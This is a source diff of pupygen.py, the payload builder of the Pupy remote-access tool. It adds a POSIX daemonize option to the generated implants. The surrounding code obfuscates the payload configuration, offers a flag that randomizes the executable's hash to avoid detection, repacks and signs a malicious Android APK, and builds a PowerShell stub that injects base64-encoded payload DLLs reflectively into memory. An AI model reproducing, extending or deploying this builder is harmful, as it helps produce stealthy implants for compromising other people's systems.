@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
@@ -108,13 +108,15 @@ def get_raw_conf(conf, obfuscate=False):
     transport_conf_dic=gen_package_pickled_dic(ROOT+os.sep, "network.transports.%s"%l.get_transport())
     #add custom transport and reload network conf
     new_conf+=compress_encode_obfs("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(transport_conf_dic)))+"\nimport sys\nsys.modules.pop('network.conf')\nimport network.conf\n"
-    
+
 
     new_conf+=obf_func("LAUNCHER=%s"%(repr(conf['launcher'])))+"\n"
     new_conf+=obf_func("LAUNCHER_ARGS=%s"%(repr(conf['launcher_args'])))+"\n"
+    if os.name == 'posix':
+        new_conf+=obf_func("DAEMONIZE=%s"%(repr(conf['daemonize'])))+"\n"
     new_conf+=offline_script
     new_conf+="\n"
-    
+
     return new_conf
 
 
@@ -123,7 +125,7 @@ def updateZip(zipname, filename, data):
     tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(zipname))
     os.close(tmpfd)
 
-    # create a temp copy of the archive without filename            
+    # create a temp copy of the archive without filename
     with zipfile.ZipFile(zipname, 'r') as zin:
         with zipfile.ZipFile(tmpname, 'w') as zout:
             zout.comment = zin.comment # preserve the comment
@@ -178,7 +180,7 @@ def get_edit_apk(path, new_path, conf):
         #repacking the tar in the apk
         with open(os.path.join(tempdir,"assets/private.mp3"), 'r') as t:
             updateZip(new_path, "assets/private.mp3", t.read())
-        
+
         #signing the tar
         try:
             res=subprocess.check_output("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '%s' pupy_key"%new_path, shell=True)
@@ -187,7 +189,7 @@ def get_edit_apk(path, new_path, conf):
                 print "Please install jarsigner first."
                 sys.exit(1)
             raise e
-        # -tsa http://timestamp.digicert.com 
+        # -tsa http://timestamp.digicert.com
         print(res)
     finally:
         #cleaning up
@@ -221,7 +223,7 @@ def parse_scriptlets(args_scriptlet, debug=False):
             except:
                 print("usage: pupygen ... -s %s,arg1=value,arg2=value,..."%name)
                 exit(1)
-                
+
         if name not in scriptlets_dic:
             print(colorize("[-] ","red")+"unknown scriptlet %s, valid choices are : %s"%(repr(name), [x for x in scriptlets_dic.iterkeys()]))
             exit(1)
@@ -277,6 +279,8 @@ if __name__=="__main__":
     parser.add_argument('-i', '--interface', default=None, help="The default interface to listen on")
     parser.add_argument('--randomize-hash', action='store_true', help="add a random string in the exe to make it's hash unknown")
     parser.add_argument('--debug-scriptlets', action='store_true', help="don't catch scriptlets exceptions on the client for debug purposes")
+    if os.name == 'posix':
+        parser.add_argument('--daemonize', default=False, action='store_true', help='Daemonize pupy on start')
     parser.add_argument('launcher', choices=[x for x in launchers.iterkeys()], default='auto_proxy', help="Choose a launcher. Launchers make payloads behave differently at startup.")
     parser.add_argument('launcher_args', nargs=argparse.REMAINDER, help="launcher options")
 
@@ -287,7 +291,7 @@ if __name__=="__main__":
     script_code=""
     if args.scriptlet:
         script_code=parse_scriptlets(args.scriptlet, debug=args.debug_scriptlets)
-    
+
 
     l=launchers[args.launcher]()
     while True:
@@ -312,6 +316,8 @@ if __name__=="__main__":
     conf['launcher']=args.launcher
     conf['launcher_args']=args.launcher_args
     conf['offline_script']=script_code
+    if os.name == 'posix':
+        conf['daemonize']=args.daemonize
     outpath=args.output
     if args.format=="exe_x86":
         binary=get_edit_pupyx86_exe(conf)
@@ -345,7 +351,7 @@ if __name__=="__main__":
         linux_modules = ""
         if not outpath:
             outpath="payload.py"
-        if args.format=="pyinst" : 
+        if args.format=="pyinst" :
             linux_modules = getLinuxImportedModules()
         packed_payload=pack_py_payload(get_raw_conf(conf))
         with open(outpath, 'wb') as w:
@@ -371,7 +377,7 @@ if __name__=="__main__":
             $PEBytesTotal = [System.Convert]::FromBase64String({3})
         }}
         Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
-        """#{1}=x86dll, {3}=x64dll 
+        """#{1}=x86dll, {3}=x64dll
         binaryX64=base64.b64encode(get_edit_pupyx64_dll(conf))
         binaryX86=base64.b64encode(get_edit_pupyx86_dll(conf))
         binaryX64parts = [binaryX64[i:i+SPLIT_SIZE] for i in range(0, len(binaryX64), SPLIT_SIZE)]
@@ -399,9 +405,5 @@ if __name__=="__main__":
     print("LAUNCHER = %s"%repr(args.launcher))
     print("LAUNCHER_ARGS = %s"%repr(args.launcher_args))
     print("SCRIPTLETS = %s"%args.scriptlet)
-
-
-
-
-
-
+    if os.name == 'posix':
+        print("DAEMONIZE = %s"%(args.daemonize) )
